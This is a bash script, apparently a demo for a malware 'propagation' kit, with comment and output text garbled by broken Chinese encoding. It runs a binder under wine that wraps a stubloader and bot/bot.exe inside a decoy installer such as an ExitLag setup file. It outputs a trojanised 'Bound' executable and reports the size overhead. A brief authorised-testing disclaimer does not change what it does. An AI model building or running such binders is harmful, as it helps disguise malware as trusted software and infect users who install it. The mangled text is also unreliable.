#!/bin/bash

# Bot����������ʾ�ű�
# չʾ���ʹ�ô�����������ļ��󶨺ͼ����Բ���

echo "=========================================="
echo "    Bot����������ʾ v1.0"
echo "    Windows 8-11�����ļ���ϵͳ"
echo "=========================================="
echo

# ����Ҫ�ļ�
echo "1. ����Ҫ���..."
REQUIRED_FILES=(
    "build/prop/stubloader.exe"
    "build/prop/binder.exe" 
    "build/prop/libpropagation.a"
    "bot/bot.exe"
)

for file in "${REQUIRED_FILES[@]}"; do
    if [ -f "$file" ]; then
        echo "  ? $file"
    else
        echo "  ? $file (ȱʧ)"
        echo "�������� ./build_propagation.sh �������"
        exit 1
    fi
done

echo
echo "2. �����Ϣ:"
echo "  Stubloader: $(stat -c%s build/prop/stubloader.exe) bytes"
echo "  Binder: $(stat -c%s build/prop/binder.exe) bytes"
echo "  Bot: $(stat -c%s bot/bot.exe) bytes"
echo "  ������: $(stat -c%s build/prop/libpropagation.a) bytes"

echo
echo "3. ���õ��ն��ļ�:"
DECOY_FILES=()
if [ -f "SetupExitLag-5.15.2-x64.exe" ]; then
    DECOY_FILES+=("SetupExitLag-5.15.2-x64.exe")
    echo "  ? SetupExitLag-5.15.2-x64.exe ($(stat -c%s SetupExitLag-5.15.2-x64.exe) bytes)"
fi

# ������������ļ�
for file in *.exe; do
    if [ -f "$file" ] && [ "$file" != "BoundExitLag.exe" ]; then
        case "$file" in
            *setup*|*install*|*update*)
                DECOY_FILES+=("$file")
                echo "  ? $file ($(stat -c%s "$file") bytes)"
                ;;
        esac
    fi
done

if [ ${#DECOY_FILES[@]} -eq 0 ]; then
    echo "  ? δ�ҵ����ʵ��ն��ļ�"
    echo "    �뽫Ҫ�󶨵�.exe�ļ����ڵ�ǰĿ¼"
    exit 1
fi

echo
echo "4. ѡ��󶨲���:"
echo "  [1] ��ExitLag��װ���� (�Ƽ�)"
echo "  [2] ѡ�������ն��ļ�"
echo "  [3] ����ʾ���а��ļ���Ϣ"
echo "  [4] ���м����Է���"
echo "  [q] �˳�"
echo

read -p "��ѡ����� [1-4,q]: " choice

case $choice in
    1)
        if [ -f "SetupExitLag-5.15.2-x64.exe" ]; then
            DECOY_FILE="SetupExitLag-5.15.2-x64.exe"
            OUTPUT_FILE="BoundExitLag.exe"
        else
            echo "����: SetupExitLag-5.15.2-x64.exe �ļ�������"
            exit 1
        fi
        ;;
    2)
        echo "���õ��ն��ļ�:"
        for i in "${!DECOY_FILES[@]}"; do
            echo "  [$((i+1))] ${DECOY_FILES[$i]}"
        done
        read -p "��ѡ���ļ����: " file_num
        if [ "$file_num" -ge 1 ] && [ "$file_num" -le "${#DECOY_FILES[@]}" ]; then
            DECOY_FILE="${DECOY_FILES[$((file_num-1))]}"
            OUTPUT_FILE="Bound_$(basename "$DECOY_FILE")"
        else
            echo "��Чѡ��"
            exit 1
        fi
        ;;
    3)
        echo
        echo "���а��ļ�:"
        for file in Bound*.exe; do
            if [ -f "$file" ]; then
                echo "  ? $file ($(stat -c%s "$file") bytes)"
                echo "    ����ʱ��: $(stat -c%y "$file")"
            fi
        done
        exit 0
        ;;
    4)
        echo
        echo "���м����Է���..."
        if [ -f "BoundExitLag.exe" ]; then
            ./analyze_exe_compatibility.sh BoundExitLag.exe
        else
            echo "δ�ҵ�BoundExitLag.exe�����Ƚ��а󶨲���"
        fi
        exit 0
        ;;
    q)
        echo "�˳���ʾ"
        exit 0
        ;;
    *)
        echo "��Чѡ��"
        exit 1
        ;;
esac

echo
echo "=========================================="
echo "��ʼ�ļ��󶨲���"
echo "=========================================="
echo "  �ն��ļ�: $DECOY_FILE"
echo "  ����ļ�: $OUTPUT_FILE"
echo "  Bot�غ�: bot/bot.exe"
echo "  Stubloader: build/prop/stubloader.exe"
echo

# ���Wine�Ƿ����
if ! command -v wine &> /dev/null; then
    echo "����: ��Ҫ��װWine������Windows��ִ���ļ�"
    echo "������: sudo apt install wine"
    exit 1
fi

echo "5. ִ�а󶨲���..."
echo "����: wine ./build/prop/binder.exe ./build/prop/stubloader.exe ./bot/bot.exe ./$DECOY_FILE ./$OUTPUT_FILE"
echo

# ִ�а�
wine ./build/prop/binder.exe ./build/prop/stubloader.exe ./bot/bot.exe "./$DECOY_FILE" "./$OUTPUT_FILE"

if [ $? -eq 0 ] && [ -f "$OUTPUT_FILE" ]; then
    echo
    echo "=========================================="
    echo "�󶨲������!"
    echo "=========================================="
    echo
    echo "6. �󶨽��:"
    echo "  ����ļ�: $OUTPUT_FILE"
    echo "  �ļ���С: $(stat -c%s "$OUTPUT_FILE") bytes"
    echo "  ����ʱ��: $(stat -c%y "$OUTPUT_FILE")"
    
    # ���㿪��
    STUB_SIZE=$(stat -c%s build/prop/stubloader.exe)
    BOT_SIZE=$(stat -c%s bot/bot.exe)
    DECOY_SIZE=$(stat -c%s "$DECOY_FILE")
    OUTPUT_SIZE=$(stat -c%s "$OUTPUT_FILE")
    OVERHEAD=$((OUTPUT_SIZE - DECOY_SIZE))
    OVERHEAD_PERCENT=$(echo "scale=4; $OVERHEAD * 100 / $DECOY_SIZE" | bc -l)
    
    echo
    echo "7. ��С����:"
    echo "  Stubloader: $STUB_SIZE bytes"
    echo "  Bot�غ�: $BOT_SIZE bytes"
    echo "  �ն��ļ�: $DECOY_SIZE bytes"
    echo "  ���ļ�: $OUTPUT_SIZE bytes"
    echo "  ���⿪��: $OVERHEAD bytes ($OVERHEAD_PERCENT%)"
    
    echo
    echo "8. ������������:"
    echo "  [1] ���м����Է���: ./analyze_exe_compatibility.sh $OUTPUT_FILE"
    echo "  [2] �鿴�������: cat /home/kali/vms/analysis_results/compatibility_summary.txt"
    echo "  [3] ��Windows������в��԰��ļ�"
    echo "  [4] ���ɱ�����������"
    
    echo
    echo "9. ��ȫ����:"
    echo "  ? �˹��߽�������Ȩ�İ�ȫ����"
    echo "  ? ���ڸ��뻷���в���"
    echo "  ? ������ط��ɷ���"
    
    echo
    read -p "�Ƿ��������м����Է���? [y/N]: " run_analysis
    if [[ $run_analysis =~ ^[Yy]$ ]]; then
        echo
        echo "���м����Է���..."
        ./analyze_exe_compatibility.sh "$OUTPUT_FILE"
        echo
        echo "�������! �鿴��ϸ���:"
        echo "  cat /home/kali/vms/analysis_results/compatibility_summary.txt"
    fi
    
else
    echo
    echo "=========================================="
    echo "�󶨲���ʧ��!"
    echo "=========================================="
    echo
    echo "���ܵ�ԭ��:"
    echo "  1. Wine��������"
    echo "  2. �ļ�Ȩ������"
    echo "  3. ���̿ռ䲻��"
    echo "  4. �����ļ���"
    echo
    echo "���������Ϣ������"
    exit 1
fi

echo
echo "=========================================="
echo "��ʾ���!"
echo "=========================================="
